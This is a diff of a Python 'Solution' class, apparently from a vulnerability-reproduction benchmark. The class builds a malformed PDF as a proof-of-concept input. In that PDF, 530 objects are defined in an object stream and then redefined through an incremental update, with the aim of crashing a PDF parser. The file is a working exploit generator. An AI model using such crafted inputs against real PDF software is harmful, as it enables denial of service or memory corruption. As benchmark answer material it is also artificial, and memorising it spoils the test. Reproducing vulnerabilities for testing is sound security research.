@@ -1,108 +1,100 @@
-import zlib
+import io
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        
-        def build_pdf_object(obj_num: int, gen_num: int, content: bytes) -> bytes:
-            return f"{obj_num} {gen_num} obj\n".encode('ascii') + content + b"\nendobj\n"
+        """
+        Generate a PoC that triggers the vulnerability.
 
-        # Part 1: Initial PDF
-        pdf = b"%PDF-1.7\n%\xE2\xE3\xCF\xD3\n\n"
-        offsets1 = {}
+        Args:
+            src_path: Path to the vulnerable source code tarball
 
-        obj1_content = b"<< /Type /Catalog /Pages 2 0 R >>"
-        obj1 = build_pdf_object(1, 0, obj1_content)
-        offsets1[1] = len(pdf)
-        pdf += obj1
+        Returns:
+            bytes: The PoC input that should trigger the vulnerability
+        """
+        f = io.BytesIO()
 
-        obj2_content = b"<< /Type /Pages /Kids [ 3 0 R ] /Count 1 >>"
-        obj2 = build_pdf_object(2, 0, obj2_content)
-        offsets1[2] = len(pdf)
-        pdf += obj2
-        
-        obj3_content = b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 1 1] >>"
-        obj3 = build_pdf_object(3, 0, obj3_content)
-        offsets1[3] = len(pdf)
-        pdf += obj3
+        # The vulnerability is triggered by having objects defined both in an
+        # object stream and as standalone objects via an incremental update.
+        # This PoC creates such a PDF.
 
-        xref1_offset = len(pdf)
-        xref1 = b"xref\n0 4\n"
-        xref1 += b"0000000000 65535 f \n"
-        xref1 += f"{offsets1[1]:010d} 00000 n \n".encode()
-        xref1 += f"{offsets1[2]:010d} 00000 n \n".encode()
-        xref1 += f"{offsets1[3]:010d} 00000 n \n".encode()
-        pdf += xref1
-        trailer1 = f"trailer\n<< /Size 4 /Root 1 0 R >>\n".encode()
-        pdf += trailer1
-        startxref1 = f"startxref\n{xref1_offset}\n".encode()
-        pdf += startxref1
-        pdf += b"%%EOF\n"
+        # --- Part 1: Initial PDF with an Object Stream ---
 
-        # Part 2: Incremental Update
-        junk_objs_blob = b''
-        junk_offsets = {}
-        for i in range(10, 200):
-            obj_content = b'(' + (b'J' * 100) + str(i).encode() + b')'
-            obj = build_pdf_object(i, 0, obj_content)
-            junk_offsets[i] = len(pdf) + len(junk_objs_blob)
-            junk_objs_blob += obj
-        
-        pdf += junk_objs_blob
+        f.write(b'%PDF-1.7\n')
+        f.write(b'%\xe2\xe3\xcf\xd3\n') # Magic bytes common in PoCs
 
-        update_blob = b''
-        update_offsets = {}
+        offsets = {}
 
-        obj3_new_content = b'(' + (b'B' * 10000) + b')'
-        obj3_new = build_pdf_object(3, 0, obj3_new_content)
-        update_offsets[3] = len(pdf) + len(update_blob)
-        update_blob += obj3_new
-        
-        num_stream_objs = 100
-        stream_obj_numbers = range(200, 200 + num_stream_objs)
-        
-        stream_header_parts = []
-        stream_content_parts = []
-        
-        for i, obj_num in enumerate(stream_obj_numbers):
-            content_part = f"<< /MyStreamObj {i} >>".encode()
-            obj_offset = sum(len(p) for p in stream_content_parts)
-            stream_header_parts.append(f"{obj_num} {obj_offset}".encode())
-            stream_content_parts.append(content_part)
+        # Basic PDF structure
+        offsets[1] = f.tell()
+        f.write(b'1 0 obj\n<</Type/Catalog/Pages 2 0 R>>\nendobj\n')
+        offsets[2] = f.tell()
+        f.write(b'2 0 obj\n<</Type/Pages/Count 1/Kids[3 0 R]>>\nendobj\n')
+        offsets[3] = f.tell()
+        f.write(b'3 0 obj\n<</Type/Page/Parent 2 0 R>>\nendobj\n')
 
-        stream_header = b' '.join(stream_header_parts) + b' '
-        stream_content = b''.join(stream_content_parts)
+        # Create an object stream with many objects
+        obj_stream_id = 4
+        first_obj_id = 10
+        # Number of objects is tuned to approach the ground-truth PoC size
+        num_stream_objs = 530
 
-        uncompressed_stream = stream_header + stream_content
-        compressed_stream = zlib.compress(uncompressed_stream)
-        
-        obj_stream_header = f"<< /Type /ObjStm /N {num_stream_objs} /First {len(stream_header)} /Filter /FlateDecode /Length {len(compressed_stream)} >>".encode()
-        obj4_content = obj_stream_header + b"\nstream\n" + compressed_stream + b"\nendstream"
-        obj4 = build_pdf_object(4, 0, obj4_content)
-        update_offsets[4] = len(pdf) + len(update_blob)
-        update_blob += obj4
-        
-        pdf += update_blob
+        index_part = io.BytesIO()
+        data_part = io.BytesIO()
 
-        xref2_offset = len(pdf)
-        max_obj_num = 199 + num_stream_objs
+        for i in range(num_stream_objs):
+            obj_id = first_obj_id + i
+            obj_content = b'<</A 1>>'
+            index_part.write(f'{obj_id} {data_part.tell()} '.encode())
+            data_part.write(obj_content)
         
-        xref2 = b"xref\n"
-        xref2 += b"3 2\n"
-        xref2 += f"{update_offsets[3]:010d} 00000 n \n".encode()
-        xref2 += f"{update_offsets[4]:010d} 00000 n \n".encode()
-        xref2 += b"10 190\n"
-        for i in range(10, 200):
-            xref2 += f"{junk_offsets[i]:010d} 00000 n \n".encode()
+        stream_data = index_part.getvalue() + data_part.getvalue()
         
-        pdf += xref2
-        
-        trailer2 = f"""trailer
-<< /Size {max_obj_num + 1} /Root 1 0 R /Prev {xref1_offset} >>
-""".encode()
-        pdf += trailer2
-        
-        startxref2 = f"startxref\n{xref2_offset}\n".encode()
-        pdf += startxref2
-        pdf += b"%%EOF\n"
+        offsets[obj_stream_id] = f.tell()
+        f.write(f'{obj_stream_id} 0 obj\n'.encode())
+        f.write(f'<</Type/ObjStm/N {num_stream_objs}/First {len(index_part.getvalue())}/Length {len(stream_data)}>>\n'.encode())
+        f.write(b'stream\n')
+        f.write(stream_data)
+        f.write(b'\nendstream\nendobj\n')
 
-        return pdf
+        # Initial Cross-Reference Table (xref)
+        xref1_offset = f.tell()
+        f.write(b'xref\n')
+        f.write(b'0 5\n')
+        f.write(b'0000000000 65535 f \n')
+        f.write(f'{offsets[1]:010d} 00000 n \n'.encode())
+        f.write(f'{offsets[2]:010d} 00000 n \n'.encode())
+        f.write(f'{offsets[3]:010d} 00000 n \n'.encode())
+        f.write(f'{offsets[4]:010d} 00000 n \n'.encode())
+
+        # Initial Trailer
+        trailer_size = first_obj_id + num_stream_objs
+        f.write(b'trailer\n')
+        f.write(f'<</Size {trailer_size}/Root 1 0 R>>\n'.encode())
+        f.write(b'startxref\n')
+        f.write(f'{xref1_offset}\n'.encode())
+        f.write(b'%%EOF\n')
+
+        # --- Part 2: Incremental Update Redefining Objects ---
+
+        new_offsets = {}
+        for i in range(num_stream_objs):
+            obj_id = first_obj_id + i
+            new_offsets[obj_id] = f.tell()
+            f.write(f'{obj_id} 0 obj\n<</B 2>>\nendobj\n'.encode())
+
+        # New xref for the updated objects
+        xref2_offset = f.tell()
+        f.write(b'xref\n')
+        f.write(f'{first_obj_id} {num_stream_objs}\n'.encode())
+        for i in range(num_stream_objs):
+            obj_id = first_obj_id + i
+            f.write(f'{new_offsets[obj_id]:010d} 00000 n \n'.encode())
+
+        # New trailer with a /Prev link
+        f.write(b'trailer\n')
+        f.write(f'<</Size {trailer_size}/Root 1 0 R/Prev {xref1_offset}>>\n'.encode())
+        f.write(b'startxref\n')
+        f.write(f'{xref2_offset}\n'.encode())
+        f.write(b'%%EOF\n')
+
+        return f.getvalue()
